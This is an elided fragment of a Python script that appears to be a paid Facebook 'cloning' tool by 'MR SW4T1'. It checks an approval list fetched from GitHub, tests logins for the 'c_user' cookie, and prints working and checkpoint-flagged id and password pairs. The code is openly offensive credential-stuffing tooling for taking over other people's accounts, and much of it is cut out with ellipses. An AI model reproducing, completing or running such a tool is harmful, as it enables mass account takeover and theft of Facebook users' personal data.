...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MR-SW4T1/P41D/blob/main/P41D.txt').text
		ua=open('.bbnew.txt','w')
...
--------------------------------------------------
\033[1;33m[🔥] K1NGX MR SW4T1:
\033[1;34m[🔥]F33L M33 H4T3RS
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [SW4T1-0K] '+ids+' | '+pas)
					else:
...
==================================================
\033[1;33m[☠️]T00LS  : FB CL0N!NG
\033[1;37m[☠️]ST4TUS  : P4!D
==================================================
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/MR-SW4T1/P41D/blob/main/P41D.txt").text
    if id in httpCaht:
